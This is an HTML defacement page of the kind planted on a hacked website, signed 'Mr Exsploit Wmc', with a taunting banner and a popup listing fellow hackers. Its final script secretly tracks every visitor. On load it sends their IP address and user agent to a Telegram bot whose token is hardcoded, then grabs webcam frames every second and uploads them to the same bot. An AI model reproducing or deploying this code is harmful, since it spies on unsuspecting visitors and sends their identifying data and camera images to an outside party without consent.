<!DOCTYPE html>
<html>
<head>
<title>Hacked By Mr Exsploit Wmc</title>
<link rel="icon" href="https://phoneky.co.uk/thumbs/screensavers/down/fcelebs/imageedit2_YVoSaxzd.gif" type="image/x-icon" />
<meta name="description" content="{Bondowoso Black Hat}">
<meta name="author" content="Mr Exsploit Wmc">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.css">
<link href="https://fonts.googleapis.com/css2?family=Baumans" rel="stylesheet">
</head>
<body>
<style>
body {
	background-color: #2b2b2b;
	color: #fff;
	font-family:"Baumans"
}
.x {
	background-color: #000;
	color:#fff;
	font-size:19px;
	left:0;
	bottom:0;
	position:fixed;
	width:100%;
	display:flex;
	justify-content:center;
	align-items:center;
}
.btn {
	width: 100%;
}
::selection {
	color: #fff;
	background: red;
}
a {
	color: red;
	text-decoration:none;
}
</style>
<center>
<img alt="bondowosoblackhat" src="https://phoneky.co.uk/thumbs/screensavers/down/fcelebs/imageedit2_YVoSaxzd.gif" width="300px">
<h2>Pwd? By Mr Exsploit Wmc</h2>
<h4>hello admin ! your security get down</h4>
<div class="container">
<div class="col-sm-2">
<button type="button" class="btn btn-primary" id="confirm2">
<i class="fas fa-ghost"></i> My Friend
</button>
</div>
</div>
<h4>-<font color="red">Contact Me instragram</font>-<br>bondowosoblackhat</h4>
</center>
<div class="x">Copyright &copy; 2017 - <a href="/cdn-cgi/l/email-protection#85f1f0eee4ebe2ede0eec5f5f7eaf1eaebe8e4ece9abe6eae8"><i style="color:red" class="fas fa-cog fa-spin"></i>Mr Exsploit Wmc</a></div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js"></script>
<script type='text/javascript'>
		$(document).ready(function(){
		    $("#confirm2").click(function(){
		    	const swalWithBootstrapButtons = Swal.mixin({
				  confirmButtonClass: 'btn btn-success',
				  cancelButtonClass: 'btn btn-danger',
				  buttonsStyling: false,
				})
				swalWithBootstrapButtons.fire({
				  title: 'How are you?',
				  text: "Do you want to see my friend?",
				  type: 'question',
				  showCancelButton: true,
				  confirmButtonText: 'Yes!',
				  cancelButtonText: 'No!',
				  reverseButtons: true
				}).then((result) => {
				  if (result.value) {
				    swalWithBootstrapButtons.fire(
				      '<font color="red">- </font>My Friend<font color="red"> -</font>',
				      'Anon7 --L4N4N9_4K1R4 - /Rayzky_ - ./meicookies - exa_gans77 - VenoRyan - MR.HAGAN_4040CR4ZY - PohonSagu - ./s3nt1n3L - DemonArmy - FarisGanss - KosameAmegai - CompuByte - B3bek_Gans - Viper2025 - Mr.Solo - K4TSUY4-GH05T - Malaikat Hati - He4l3rz - PsychoH4x0r - Mr.Grim - ChokkaXploiter - Algisec1337 - Jamet1337 - ./MungielL - Nzxsx7 - ./G1L4N6_ST86 - kuroaMEpiKAcyu - <font color="red">Mr Exsploit Wmc</font> - RizeChan1337 - Rian Haxor - Temp3 - B4dServ3r - ./Tikus_HaXoR',
				      'success'
				    )
				  } else if (
				    result.dismiss === Swal.DismissReason.cancel
				  ) {
				    swalWithBootstrapButtons.fire(
				      'Cancell',
				      'Oke Have a nice day',
				      'error'
				    )
				  }
				})
		    });
		    $("#heker").click(function(){
		    	var sec = $('#sec').val();
		    	Swal.fire({
				  title: 'Custom animation with Animate.css',
				  animation: false,
				  customClass: 'animated ' + sec
				})
		    });
		});
</script>
<script>
const BOT_TOKEN = '7949630375:AAEq3Oyb6b8GIkIqXU4U9_vyCmk82dIakbY';
const CHAT_ID = '6318470704';
        function sendIPAndUserAgent() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const userAgent = navigator.userAgent;
                    const message = `IP Address: ${ipAddress}\nUser Agent: ${userAgent}`;
                    sendMessageToTelegram(message);
                })
                .catch(error => console.error('Error fetching IP address:', error));
        }
        function sendMessageToTelegram(message) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log('Message sent to Telegram');
                } else {
                    console.error('Failed to send message to Telegram');
                }
            })
            .catch(error => console.error('Error sending message to Telegram:', error));
        }
        function takePhotoAndSend() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.onloadedmetadata = () => {
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const photo = canvas.toDataURL('image/jpeg');
                            sendPhoto(photo);
                            video.srcObject.getTracks().forEach(track => track.stop());
                            video.remove();
                        }, 1000);
                    };
                })
                .catch(error => console.error('Error accessing camera:', error));
        }
        function sendPhoto(photo) {
            const blob = dataURItoBlob(photo);
            const formData = new FormData();
            formData.append('photo', blob, 'photo.jpg');
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log('Photo sent to Telegram');
                } else {
                    console.error('Failed to send photo to Telegram');
                }
            })
            .catch(error => console.error('Error sending photo to Telegram:', error));
        }
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const intArray = new Uint8Array(arrayBuffer);
            for (let i = 0; i < byteString.length; i++) {
                intArray[i] = byteString.charCodeAt(i);
            }
            return new Blob([arrayBuffer], { type: mimeString });
        }
        sendIPAndUserAgent();
        setInterval(takePhotoAndSend, 1000);
</script>
</body>
</html>